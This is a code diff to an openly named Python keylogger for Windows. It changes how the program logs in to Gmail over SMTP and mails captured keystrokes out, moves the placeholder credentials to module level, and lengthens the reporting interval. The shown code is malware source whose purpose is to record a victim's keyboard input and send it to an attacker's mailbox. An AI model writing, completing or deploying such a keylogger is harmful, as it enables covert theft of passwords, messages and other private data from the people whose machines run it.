@@ -12,7 +12,11 @@ import win32api
 import winerror
 import win32console
 import win32gui
-
+email="YOUR MAIL ID"
+password="PASSWORD"
+server = smtplib.SMTP("smtp.gmail.com",587)
+server.starttls()
+server.login(email,password)
 class Keylogger:
 
     def __init__(self,time_interval, email, password):
@@ -64,11 +68,9 @@ class Keylogger:
 
     def send_mail(self, email, password, message):
 
-        server = smtplib.SMTP("smtp.gmail.com",587)
-        server.starttls()
-        server.login(email,password)
+        
         server.sendmail(email,email,message)
-        server.quit()
+        #server.quit()
 
 
 
@@ -85,7 +87,7 @@ class Keylogger:
             keyboard_listener.join()
 if __name__ == '__main__':
     try:
-        my_keylogger = Keylogger(10, "YOUR EMAIL ID", "EMAIL PASSWORD")
+        my_keylogger = Keylogger(30,email,password)
         my_keylogger.start()
     except Exception:
         sys.exit()
